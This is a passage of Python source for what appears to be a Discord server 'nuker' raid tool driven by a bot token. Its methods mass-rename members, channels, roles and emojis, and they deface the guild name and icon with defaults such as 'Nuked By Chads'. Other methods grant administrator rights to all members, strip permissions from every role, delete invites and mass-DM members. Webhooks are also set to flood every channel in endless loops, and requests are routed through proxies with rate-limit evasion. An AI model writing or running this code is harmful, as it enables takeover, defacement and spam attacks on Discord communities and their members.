            async with self.semaphore:
                try:
                    session = await self._get_session()
                    async with session.patch(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{member_id}",
                        headers={"Authorization": f"Bot {token}"},
                        json={"nick": new_nick},
                        proxy=self._get_proxy(),
                    ) as resp:
                        if resp.status in (200, 204):
                            success_count += 1
                            ts = datetime.now().strftime("%H:%M:%S")
                            print(f"{format_log_message('SUCCESS', f'Nicked → {member_id}', 52)}")
                        elif resp.status == 429:
                            try:
                                data = await resp.json()
                                await asyncio.sleep(data.get("retry_after", 0.7) + random.uniform(0.1, 0.4))
                            except:
                                await asyncio.sleep(0.9)
                            async with session.patch(
                                f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{member_id}",
                                headers={"Authorization": f"Bot {token}"},
                                json={"nick": new_nick},
                                proxy=self._get_proxy(),
                            ) as retry:
                                if retry.status in (200, 204):
                                    success_count += 1
                                    ts = datetime.now().strftime("%H:%M:%S")
                                    print(f"{format_log_message('SUCCESS', f'Nicked → {member_id}', 52)}")
                except:
                    pass

        start_time = time.time()
        await asyncio.gather(*(nick_one(mid) for mid in members), return_exceptions=True)
        duration = time.time() - start_time

        print(format_log_message("SUCCESS", f"Finished: {success_count}/{total} members nicked in {duration:.2f}s", 55))
        time.sleep(2.5)
        return success_count

    async def execute_change_icon(self, token: str):
        if not os.path.exists("Guild-Icon"):
            print(format_log_message("ERROR", "Guild-Icon folder not found!", 38))
            return False
        images = [f for f in os.listdir("Guild-Icon") if f.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.webp'))]
        if not images:
            print(format_log_message("ERROR", "No images in Guild-Icon folder!", 36))
            return False
        mode_start, mode_end = get_mode_colors()
        print(format_log_message("INFO", "Available Icons:", 50))
        print(gradient_text("╭" + "─" * 60 + "╮", mode_start, mode_end, bold=True))
        for i, img in enumerate(images, 1):
            print(gradient_text(f"│ {i:<2}│{img:<56}│", mode_start, mode_end, bold=True))
        print(gradient_text("╰" + "─" * 60 + "╯", mode_start, mode_end, bold=True))
        try:
            choice_input = await self.async_input(format_log_message("INFO", "Choose icon number", 50))
            choice = int(choice_input.strip()) - 1
            if 0 <= choice < len(images):
                img_path = os.path.join("Guild-Icon", images[choice])
                with open(img_path, "rb") as f:
                    img_data = base64.b64encode(f.read()).decode('utf-8')
                ext = images[choice].split('.')[-1]
                payload = {"icon": f"data:image/{ext};base64,{img_data}"}
                async with self.semaphore:
                    session = await self._get_session()
                    try:
                        async with session.patch(
                            f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}",
                            headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                        ) as response:
                            if response.status in [200, 204]:
                                print(format_log_message("SUCCESS", "Changed guild icon", 42))
                                return True
                            else:
                                print(format_log_message("ERROR", "Failed to change guild icon", 38))
                                return False
                    except asyncio.CancelledError:
                        print(format_log_message("ERROR", "Request was cancelled (timeout or event loop stop)", 41))
                        return False
                    except aiohttp.ClientError as e:
                        print(format_log_message("ERROR", f"Network error while changing guild icon | {e}", 41))
                        return False
                    except Exception as e:
                        print(format_log_message("ERROR", f"Unexpected error while changing guild icon | {e}", 41))
                        return False
            else:
                print(format_log_message("ERROR", f"Invalid choice: {choice}", 47))
                return False
        except ValueError:
            print(format_log_message("ERROR", f"Invalid input:!", 49))
            return False

    async def execute_change_guild_info(self, token: str, new_name: str = None, new_desc: str = None):
        if new_name is None:
            default_name = __config__.get("operations", {}).get("guild_name", "Nuked By Chads")
            new_name = await self.async_input(format_log_message("INFO", f"New guild name (default: {default_name})", 50))
            new_name = new_name.strip()
            if not new_name:
                new_name = default_name
        
        if new_desc is None:
            new_desc = await self.async_input(format_log_message("INFO", "New guild description", 50))
            new_desc = new_desc.strip()

        if not new_name:
            print(format_log_message("ERROR", "Name required!", 48))
            return False
        
        payload = {"name": new_name}
        if new_desc:
            payload["description"] = new_desc
        
        async with self.semaphore:
            session = await self._get_session()
            async with session.patch(
                f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}",
                headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
            ) as response:
                    if response.status in [200, 204]:
                        print(format_log_message("SUCCESS", f"Guild updated: {new_name}", 43))
                        return True
                    else:
                        print(format_log_message("ERROR", "Failed to update guild", 42))
                        return False

    async def execute_give_admin(self, token: str):
        try:
            session = await self._get_session()

            admin_role_payload = {"name": "Admin", "color": 0xFF0000, "permissions": "8"}
            
            async with session.post(
                f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/roles",
                headers={"Authorization": f"Bot {token}"}, json=admin_role_payload, proxy=self._get_proxy()
            ) as role_resp:
                if role_resp.status == 429:
                    return await self.execute_give_admin(token)
                if role_resp.status != 200:
                    print(format_log_message("ERROR", "Failed to create admin role", 36))
                    return (0, 0)
                admin_role_id = (await role_resp.json())['id']
                print(format_log_message("SUCCESS", f"Created admin role #{admin_role_id}", 39))
                
            user_input = await self.async_input(format_log_message("INFO", "User IDs (comma-separated) or 'all'", 50))
            user_input = user_input.strip()
            users_to_admin = []
            
            if user_input.lower() == 'all':
                async with session.get(
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members?limit=1000",
                    headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                ) as members_resp:
                    if members_resp.status == 429:
                        return await self.execute_give_admin(token)
                    if members_resp.status != 200:
                        print(format_log_message("ERROR", "Failed to fetch members", 40))
                        return (0, 0)
                    members = await members_resp.json()
                    users_to_admin = [member['user']['id'] for member in members if member['user']['id'] not in self.whitelist]
                    print(format_log_message("SUCCESS", f"Fetched {len(users_to_admin)} non-whitelisted members", 40))
            else:
                users_to_admin = [uid.strip() for uid in user_input.split(',') if uid.strip() and uid.strip() not in self.whitelist]
                if not users_to_admin:
                    print(format_log_message("ERROR", "No valid user IDs provided or all are whitelisted!", 32))
                    return (0, 0)
                
            success_count = 0
            total_attempts = len(users_to_admin)
            
            for idx, user_id in enumerate(users_to_admin, 1):

                try:
                    async with session.get(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{user_id}",
                        headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                    ) as member_resp:
                        if member_resp.status == 429:
                            async with session.get(
                                f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{user_id}",
                                headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                            ) as retry_resp:
                                if retry_resp.status != 200:
                                    print(format_log_message("ERROR", f"Failed to fetch member {user_id}", 45))
                                    continue
                                member_data = await retry_resp.json()
                        elif member_resp.status != 200:
                            print(format_log_message("ERROR", f"Failed to fetch member {user_id}", 45))
                            continue
                        else:
                            member_data = await member_resp.json()

                        current_roles = member_data.get('roles', [])
                        if admin_role_id not in current_roles:
                            current_roles.append(admin_role_id)

                        assign_payload = {"roles": current_roles}
                        
                    async with session.patch(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{user_id}",
                        headers={"Authorization": f"Bot {token}"}, json=assign_payload, proxy=self._get_proxy()
                    ) as response:
                        if response.status == 429:
                            async with session.patch(
                                f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{user_id}",
                                headers={"Authorization": f"Bot {token}"}, json=assign_payload, proxy=self._get_proxy()
                            ) as retry_response:
                                if retry_response.status in [200, 204]:
                                    print(format_log_message("SUCCESS", f"Assigned admin to #{user_id} ({idx}/{total_attempts})", 50))
                                    success_count += 1
                                else:
                                    print(format_log_message("ERROR", f"Failed to assign admin to #{user_id}", 45))
                        elif response.status in [200, 204]:
                            print(format_log_message("SUCCESS", f"Assigned admin to #{user_id} ({idx}/{total_attempts})", 50))
                            success_count += 1
                        else:
                            print(format_log_message("ERROR", f"Failed to assign admin to #{user_id}", 45))
                except Exception as e:
                    print(format_log_message("ERROR", f"Error assigning admin to {user_id}: {e}", 45))
                
            print(format_log_message("SUCCESS", f"Gave admin to {success_count}/{total_attempts} users", 40))
            return (success_count, total_attempts)
        except Exception as e:
            print(format_log_message("ERROR", f"Give admin failed: {e}", 40))
            return (0, 0)

    async def execute_delete_invites(self, token: str):
        start_time = time.time()
        async with self.semaphore:
            try:
                session = await self._get_session()
                async with session.get(
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/invites",
                    headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                    ) as invites_resp:
                        if invites_resp.status == 200:
                            invites = await invites_resp.json()
                            total_invites = len(invites)
                            deleted = 0
                            
                            async def delete_invite(invite_code):
                                nonlocal deleted
                                async with self.semaphore:
                                    del_session = await self._get_session()
                                    async with del_session.delete(
                                        f"https://discord.com/api/{next(self.version)}/invites/{invite_code}",
                                        headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                                    ) as del_resp:
                                            if del_resp.status in [200, 204]:
                                                deleted += 1
                                                return True
                                            return False
                                            
                            tasks = [delete_invite(invite['code']) for invite in invites]
                            await asyncio.gather(*tasks)
                            end_time = time.time()
                            return (deleted, end_time - start_time, total_invites)
                        else:
                            print(format_log_message("ERROR", "Failed to fetch invites", 41))
                            return (0, 0, 0)
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to fetch invites | {e}", 41))
                return (0, 0, 0)

    

    async def execute_timeout_all(self, member: str, duration_seconds: int, token: str):
        if member in self.whitelist:
            print(format_log_message("INFO", f"Skipping whitelisted member {member} (Timeout)", 41))
            return True

        async with self.semaphore:

            timeout_end = (datetime.utcnow() + timedelta(seconds=duration_seconds)).isoformat()
            payload = {"communication_disabled_until": timeout_end}
            try:
                session = await self._get_session()
                async with session.patch(
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{member}",
                    headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                    ) as response:
                        if response.status in [200, 204]:
                            print(format_log_message("SUCCESS", f"Timed out {member} for {duration_seconds}s", 39))
                            return True
                        elif response.status == 429:
                            retry_after = (await response.json()).get('retry_after', 2)
                            return await self.execute_timeout_all(member, duration_seconds, token)
                        elif response.status == 404:
                            print(format_log_message("INFO", f"Member {member} not found (404), skipping.", 46))
                            return False
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions to timeout {member}", 35))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to timeout {member}: {response.status}", 46))
                            return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to timeout {member} | {e}", 46))
                return False

    
    async def execute_rename_channels(self, token: str):
        new_name = await self.async_input(format_log_message("INFO", "New channel Name", 50))
        session = await self._get_session()
        async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                             headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                if resp.status != 200:
                    print(format_log_message("ERROR", "Failed to fetch channels", 40))
                    return 0
                channels = await resp.json()
        
        async def rename_channel(i, ch):
            try:
                name = new_name.format(i=i)
                payload = {"name": name}
                async with session.patch(
                    f"https://discord.com/api/v10/channels/{ch['id']}",
                    headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy(), timeout=aiohttp.ClientTimeout(total=5)
                    ) as resp:
                        if resp.status == 200:
                            print(format_log_message("SUCCESS", f"Renamed channel #{ch['id']} → {name}", 45))
                            return True
                        else:
                            print(format_log_message("ERROR", f"Failed to rename channel #{ch['id']}", 45))
                            return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to rename channel #{ch['id']} | {e}", 45))
                return False
        
        tasks = [rename_channel(i, ch) for i, ch in enumerate(channels)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        count = sum(1 for r in results if r is True)
        return count

    
    async def execute_rename_roles(self, token: str):
        new_name = await self.async_input(format_log_message("INFO", "New role Name", 50))
        session = await self._get_session()
        async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/roles",
                             headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                if resp.status != 200:
                    return 0
                roles = await resp.json()
        
        async def rename_role(i, role):
            """Rename a single role - burst speed, no retry"""
            try:
                name = new_name.format(i=i)
                payload = {"name": name}
                async with session.patch(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/roles/{role['id']}",
                    headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy(), timeout=aiohttp.ClientTimeout(total=5)
                    ) as resp:
                        if resp.status == 200:
                            print(format_log_message("SUCCESS", f"Renamed role #{role['id']} → {name}", 45))
                            return True
                        else:
                            print(format_log_message("ERROR", f"Failed to rename role #{role['id']}", 45))
                            return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to rename role #{role['id']} | {e}", 45))
                return False
        
        tasks = [rename_role(i, role) for i, role in enumerate(roles)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        count = sum(1 for r in results if r is True)
        return count

    async def execute_spam_all_channels(self, token: str):
        session = await self._get_session()
        spam_message = __config__.get("operations", {}).get("spam_message", "@everyone @here Wizzled by Chads!")
        
        try:
            async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                                   headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                if resp.status == 200:
                    channels = await resp.json()
                    text_channels = [c for c in channels if c['type'] == 0]
                else:
                    print(format_log_message("ERROR", "Failed to fetch channels for spam.", 50))
                    return 0
        except Exception as e:
            print(format_log_message("ERROR", f"Failed to fetch channels for spam: {e}", 50))
            return 0

        if not text_channels:
            print(format_log_message("ERROR", "No text channels found for spam.", 50))
            return 0

        spam_tasks = [self.execute_massping(channel['id'], spam_message, token) for channel in text_channels]
        results = await asyncio.gather(*spam_tasks, return_exceptions=True)
        success_count = sum(1 for r in results if r is True)
        return success_count

    async def execute_webhook_spam(self, token: str):
        webhook_config = __config__.get("nuke", {}).get("webhooks", {})
        webhook_name = webhook_config.get("name", "Chads op")
        webhook_avatar_url = webhook_config.get("avatar_url")
        webhook_messages = webhook_config.get("messages", ["@everyone @here Wizzled by Chads"])

        avatar_data = None
        if webhook_avatar_url:
            avatar_data = await self._fetch_image_as_base64(webhook_avatar_url)

        session = await self._get_session()

        try:
            async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                                   headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                if resp.status == 200:
                    channels = await resp.json()
                    text_channels = [c for c in channels if c['type'] == 0]
                else:
                    print(format_log_message("ERROR", "Failed to fetch channels for webhook spam.", 50))
                    return 0
        except Exception as e:
            print(format_log_message("ERROR", f"Failed to fetch channels for webhook spam: {e}", 50))
            return 0

        if not text_channels:
            print(format_log_message("ERROR", "No text channels found for webhook spam.", 50))
            return 0

        async def create_webhook(channel):
            webhook_payload = {"name": webhook_name}
            if avatar_data:
                webhook_payload["avatar"] = avatar_data
            try:
                async with session.post(
                    f"https://discord.com/api/v10/channels/{channel['id']}/webhooks",
                    headers={"Authorization": f"Bot {token}"},
                    json=webhook_payload, proxy=self._get_proxy()
                ) as resp:
                    if resp.status == 200:
                        webhook_data = await resp.json()
                        print(format_log_message("SUCCESS", f"Webhook created in channel ID {channel['id']} (#{channel['name']})", 50))
                        return webhook_data.get("url")
                    else:
                        print(format_log_message("ERROR", f"Failed to create webhook in channel ID {channel['id']} (#{channel['name']})", 50))
                        return None
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to create webhook in {channel['name']}: {e}", 50))
                return None

        creation_tasks = [create_webhook(channel) for channel in text_channels]
        webhook_urls = await asyncio.gather(*creation_tasks)
        webhook_urls = [url for url in webhook_urls if url]

        if not webhook_urls:
            print(format_log_message("ERROR", "Failed to create any webhooks.", 50))
            return 0

        print(format_log_message("INFO", f"Starting continuous webhook spam to {len(webhook_urls)} webhooks.", 40))

        async def continuous_spam(webhook_url):
            while True:
                try:
                    await self._send_webhook_message_rapid(session, webhook_url, random.choice(webhook_messages))
                except Exception as e:
                    print(format_log_message("ERROR", f"Webhook spam error: {e}", 50))

        for url in webhook_urls:
            asyncio.create_task(continuous_spam(url))

        print(format_log_message("SUCCESS", "Webhook spam is running in the background.", 50))
        return len(webhook_urls)

    async def _send_webhook_message_rapid(self, session, webhook_url, message):
        while True:
            try:
                async with session.post(
                    webhook_url,
                    json={"content": message}, proxy=self._get_proxy()
                ) as resp:
                    if resp.status in [200, 204]:
                        print(format_log_message("SUCCESS", f"Message sent to {webhook_url}", 50)) 
                        return True
                    elif resp.status == 429:
                        try:
                            retry_after = (await resp.json()).get("retry_after", 1.0)
                        except aiohttp.ContentTypeError:
                            retry_after = 0.5
                        print(format_log_message("INFO", f"Rate limited. Delaying for {retry_after}s", 50))
                        await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                    else:
                        print(format_log_message("ERROR", f"Failed to send message to {webhook_url} - Status: {resp.status}", 50))
                        return False
            except Exception as e:
                print(format_log_message("ERROR", f"Exception while sending to {webhook_url}: {e}", 50))
                return False

    async def _fetch_image_as_base64(self, url):
        try:
            session = await self._get_session()
            async with session.get(url, proxy=self._get_proxy()) as response:
                if response.status == 200:
                    image_bytes = await response.read()
                    encoded_string = base64.b64encode(image_bytes).decode('utf-8')
                    return f"data:{response.headers['Content-Type']};base64,{encoded_string}"
        except Exception as e:
            print(format_log_message("ERROR", f"Failed to fetch avatar URL: {e}", 40))
        return None

    

    async def _send_dm(self, member_id: str, message: str, token: str):
        if member_id in self.whitelist:
            print(format_log_message("INFO", f"Skipping whitelisted member {member_id} (DM)", 41))
            return None  

        async with self.semaphore:

            try:
                session = await self._get_session()
                
                async with session.post(
                    f"https://discord.com/api/v10/users/@me/channels",
                    headers={"Authorization": f"Bot {token}"}, json={"recipient_id": member_id}, proxy=self._get_proxy()
                    ) as dm_resp:
                        if dm_resp.status == 200:
                            dm_channel = await dm_resp.json()
                            
                            async with session.post(
                                f"https://discord.com/api/v10/channels/{dm_channel['id']}/messages",
                                headers={"Authorization": f"Bot {token}"}, json={"content": message}, proxy=self._get_proxy()
                            ) as msg_resp:
                                if msg_resp.status == 200:
                                    print(format_log_message("SUCCESS", f"DM sent to {member_id}", 45))
                                    return True
                                else:
                                    
                                    print(format_log_message("ERROR", f"Failed to send DM to {member_id} (Status: {msg_resp.status})", 35))
                                    return False
                        else:
                            
                            print(format_log_message("ERROR", f"Failed to open DM with {member_id} (Status: {dm_resp.status})", 35))
                            return False
            except Exception as e:
                print(format_log_message("ERROR", f"Exception while DMing {member_id}: {e}", 35))
                return False

    
    async def execute_dm_all(self, token: str):
        default_dm = __config__.get("operations", {}).get("dm_message", "@everyone Chads Nuked This Server!")
        message = await self.async_input(format_log_message("INFO", f"DM message (default: {default_dm})", 50))
        if not message.strip():
            message = default_dm

        try:
            with open("fetched/members.txt", "r") as f:
                members = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(format_log_message("ERROR", "members.txt not found. Fetch first.", 29))
            return 0
        count = 0
        for member in members:
            if member in self.whitelist:
                print(format_log_message("INFO", f"Skipping whitelisted member {member} (DM)", 41))
                continue
        
        tasks = [self._send_dm(member, message, token) for member in members]
        results = await asyncio.gather(*tasks)
        return sum(1 for r in results if r is True)


    async def execute_unban_all(self, token: str):
        choice = await self.async_input(format_log_message("INFO", "Unban specific user ID, or 'all' for everyone? ", 50))
        choice = choice.strip().lower()
        unbanned_count = 0
        start_time = time.time()
        session = await self._get_session()

        if choice == "all":
            try:
                async with session.get(
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/bans",
                    headers={"Authorization": f"Bot {token}"},
                    proxy=self._get_proxy()
                ) as resp:
                    if resp.status != 200:
                        print(format_log_message("ERROR", f"Failed to fetch ban list (status {resp.status})", 45))
                        await asyncio.sleep(2.5)
                        return 0
                    bans = await resp.json()
                    if not bans:
                        print(format_log_message("INFO", "No banned members found in this server.", 45))
                        await asyncio.sleep(2.5)
                        return 0
                    print(format_log_message("INFO", f"Found {len(bans)} banned users. Starting mass unban...", 48))
                    banned_ids = [ban['user']['id'] for ban in bans]
            except Exception as e:
                print(format_log_message("ERROR", f"Error fetching bans: {e}", 42))
                await asyncio.sleep(2.5)
                return 0

            tasks = []
            for user_id in banned_ids:
                if user_id in self.whitelist:
                    print(format_log_message("INFO", f"Skipping whitelisted user {user_id} (unban)", 45))
                    continue
                tasks.append(self._execute_single_unban(user_id, token))

            results = await asyncio.gather(*tasks, return_exceptions=True)
            unbanned_count = sum(1 for r in results if r is True)

        else:
            if not choice.isdigit():
                print(format_log_message("ERROR", "Invalid input — must be a user ID (numbers) or 'all'", 48))
                await asyncio.sleep(2.0)
                return 0
            user_id = choice
            success = await self._execute_single_unban(user_id, token)
            unbanned_count = 1 if success else 0

        duration = time.time() - start_time
        
        if unbanned_count > 0:
            print(format_log_message("SUCCESS", f"Unbanned {unbanned_count} user(s) in {duration:.2f}s", 45))
        else:
            print(format_log_message("INFO", f"No users were unbanned ({duration:.2f}s)", 42))

        await asyncio.sleep(3.0)

        return unbanned_count

    async def _execute_single_unban(self, user_id: str, token: str) -> bool:
        async with self.semaphore:
            for attempt in range(3):
                try:
                    async with (await self._get_session()).delete(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/bans/{user_id}",
                        headers={"Authorization": f"Bot {token}"},
                        proxy=self._get_proxy()
                    ) as resp:
                        if resp.status in (200, 204, 404):
                            print(format_log_message("SUCCESS", f"Unbanned {user_id}", 50))
                            return True
                        elif resp.status == 429:
                            try:
                                data = await resp.json()
                                retry_after = data.get("retry_after", 1.0)
                            except:
                                retry_after = 1.0
                            print(format_log_message("INFO", f"Rate limited — waiting {retry_after:.1f}s for {user_id}", 45))
                            await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                            continue
                        elif resp.status == 403:
                            text = await resp.text()
                            if "Missing Permissions" in text:
                                print(format_log_message("ERROR", "Missing ban permissions — stopping", 42))
                                await asyncio.sleep(2.5)
                                return False
                            else:
                                print(format_log_message("ERROR", f"Forbidden: {text[:80]}...", 45))
                                await asyncio.sleep(2.5)
                                return False
                        else:
                            print(format_log_message("ERROR", f"Failed to unban {user_id} (status {resp.status})", 48))
                            await asyncio.sleep(2.0)
                            return False
                except Exception as e:
                    print(format_log_message("ERROR", f"Exception unbanning {user_id}: {e}", 42))
                    await asyncio.sleep(2.0)
                    return False

            print(format_log_message("ERROR", f"Failed to unban {user_id} after retries", 45))
            await asyncio.sleep(2.5)
            return False
                       
    async def execute_untimeout_all(self, token: str):
        async def untimeout_member(session, member_id):
            if str(member_id) in self.whitelist:
                print(format_log_message("INFO", f"Skipping whitelisted member {member_id} (Untimeout)", 41))
                return False
            
            try:
                payload = {"communication_disabled_until": None}
                async with session.patch(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/members/{member_id}",
                    headers={"Authorization": f"Bot {token}"}, 
                    json=payload, 
                    proxy=self._get_proxy(),
                ) as resp:
                    if resp.status in [200, 204]:
                        print(format_log_message("SUCCESS", f"Removed timeout from member #{member_id}", 40))
                        return True
                    elif resp.status == 404:
                        print(format_log_message("INFO", f"Member {member_id} not found (404), skipping.", 46))
                        return False
                    elif resp.status == 429:
                        print(format_log_message("ERROR", f"Rate limited while untimeouting member #{member_id}", 40))
                        return False
                    else:
                        print(format_log_message("ERROR", f"Failed to untimeout member #{member_id} - Status: {resp.status}", 40))
                        return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to untimeout member #{member_id} | {e}", 40))
                return False
        
        session = await self._get_session()
        
        try:
            with open("fetched/members.txt", "r") as f:
                members = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(format_log_message("ERROR", "members.txt not found. Fetch first.", 29))
            return 0
        
        if not members:
            print(format_log_message("INFO", "No members found in members.txt", 40))
            return 0

        total_members = len(members)
        print(format_log_message("INFO", f"Attempting to remove timeout from {total_members} members (max speed)...", 40))

        tasks = [untimeout_member(session, member_id) for member_id in members]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        count = sum(1 for r in results if r is True)
        print(format_log_message("SUCCESS", f"Finished: Removed timeout from {count}/{total_members} members.", 40))
        time.sleep(2.5)
        return count
        

    
    async def execute_strip_perms(self, token: str):
        session = await self._get_session()
        try:
            async with session.get(
                f"https://discord.com/api/v10/guilds/{self.guildid}/roles",
                headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
            ) as resp:
                if resp.status != 200:
                    print(format_log_message("ERROR", "Failed to fetch roles", 45))
                    return 0
                roles = await resp.json()
        except Exception as e:
            print(format_log_message("ERROR", f"Failed to fetch roles | {e}", 45))
            return 0

        roles_to_strip = [r for r in roles if r['id'] != self.guildid]
        print(format_log_message("INFO", f"Stripping permissions from {len(roles_to_strip)} roles (BURST SPEED)...", 45))
        
        async def strip_role(role_id):
            payload = {"permissions": "0"}
            try:
                async with session.patch(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/roles/{role_id}",
                    headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy(), timeout=aiohttp.ClientTimeout(total=5)
                ) as resp:
                    if resp.status == 200:
                        print(format_log_message("SUCCESS", f"Stripped perms from role #{role_id}", 45))
                        return True
                    else:
                        print(format_log_message("ERROR", f"Failed to strip perms from role #{role_id}", 45))
                        return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to strip role #{role_id} | {e}", 45))
                return False

        tasks = [strip_role(role['id']) for role in roles_to_strip]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        count = sum(1 for r in results if r is True)
        print(format_log_message("SUCCESS", f"Stripped permissions from {count}/{len(roles_to_strip)} roles", 45))
        time.sleep(2.5)
        return count

    
    async def execute_auto_admin(self, token: str, user_id: str = None):
     if user_id is None:
        user_id = str(__client__.user.id)
     if user_id in self.whitelist:
        print(format_log_message("INFO", f"Skipping whitelisted user {user_id}", 35))
        return False
     async with self.semaphore:
        try:
            session = await self._get_session()
            async with session.post(
                f"https://discord.com/api/v10/guilds/{self.guildid}/roles",
                headers={"Authorization": f"Bot {token}"},
                json={"name": "Owner", "permissions": "8", "color": 0xFF0000},
                proxy=self._get_proxy()
            ) as resp:
                if resp.status == 429:
                    return await self.execute_auto_admin(token, user_id)
                if resp.status != 200:
                    print(format_log_message("ERROR", "Failed to create admin role", 45))
                    return False
                role_data = await resp.json()
                role_id = role_data['id']
                print(format_log_message("SUCCESS", f"Created admin role #{role_id}", 45))
            async with session.get(
                f"https://discord.com/api/v10/guilds/{self.guildid}/roles",
                headers={"Authorization": f"Bot {token}"},
                proxy=self._get_proxy()
            ) as roles_resp:
                if roles_resp.status == 200:
                    all_roles = await roles_resp.json()
                    async with session.get(
                        f"https://discord.com/api/v10/guilds/{self.guildid}/members/{self.client.user.id}",
                        headers={"Authorization": f"Bot {token}"},
                        proxy=self._get_proxy()
                    ) as bot_member_resp:
                        if bot_member_resp.status == 200:
                            bot_data = await bot_member_resp.json()
                            bot_role_ids = bot_data.get('roles', [])
                            bot_roles = [r for r in all_roles if r['id'] in bot_role_ids]
                            if bot_roles:
                                highest_bot_pos = max(r['position'] for r in bot_roles)
                                target_pos = max(1, highest_bot_pos - 1)
                                payload = [{"id": role_id, "position": target_pos}]
                                await session.patch(
                                    f"https://discord.com/api/v10/guilds/{self.guildid}/roles",
                                    headers={"Authorization": f"Bot {token}"},
                                    json=payload,
                                    proxy=self._get_proxy()
                                )
                                print(format_log_message("SUCCESS", f"Moved role to position {target_pos}", 45))
            async with session.put(
                f"https://discord.com/api/v10/guilds/{self.guildid}/members/{user_id}/roles/{role_id}",
                headers={"Authorization": f"Bot {token}"},
                proxy=self._get_proxy()
            ) as assign_resp:
                if assign_resp.status in [200, 204]:
                    print(format_log_message("SUCCESS", f"Assigned admin to {user_id}", 45))
                    return True
                else:
                    print(format_log_message("ERROR", f"Failed to assign role to {user_id}", 45))
                    return False
        except Exception as e:
            print(format_log_message("ERROR", f"Auto admin failed: {e}", 45))
            return False

    async def execute_rename_emojis(self, token: str):
        new_name = await self.async_input(format_log_message("INFO", "New emoji name (use {i})", 50))
        session = await self._get_session()
        async with session.get(
            f"https://discord.com/api/v10/guilds/{self.guildid}/emojis",
            headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
            ) as resp:
                if resp.status != 200:
                    return 0
                emojis = await resp.json()
        count = 0
        for i, emoji in enumerate(emojis):
            name = new_name.format(i=i)
            payload = {"name": name}
            async with self.semaphore:
                async with session.patch(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/emojis/{emoji['id']}",
                    headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                    ) as resp:
                        if resp.status == 200:
                            count += 1
        return count
    
    
    async def execute_unick_all_fast(self, token: str):
        try:
            with open("fetched/members.txt", "r") as f:
                members = [line.strip() for line in f if line.strip() and line.strip().isdigit()]
        except:
            print(format_log_message("ERROR", "members.txt missing or empty", 40))
            return 0

        members = [m for m in members if m not in self.whitelist]
        total = len(members)

        if total == 0:
            print(format_log_message("INFO", "No members to un-nick after whitelist filter", 45))
            return 0

        print(format_log_message("INFO", f"Starting un-nick all  ({total} targets)", 50))

        success_count = 0

        async def unick_one(member_id: str):
            nonlocal success_count
            async with self.semaphore:
                try:
                    session = await self._get_session()
                    async with session.patch(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{member_id}",
                        headers={"Authorization": f"Bot {token}"},
                        json={"nick": None},
                        proxy=self._get_proxy(),
                    ) as resp:
                        if resp.status in (200, 204):
                            success_count += 1
                            print(f"{format_log_message('SUCCESS', f'Unnicked → {member_id}', 52)}")
                        elif resp.status == 429:
                            try:
                                data = await resp.json()
                                await asyncio.sleep(data.get("retry_after", 0.7) + random.uniform(0.1, 0.4))
                            except:
                                await asyncio.sleep(0.9)
                            async with session.patch(
                                f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{member_id}",
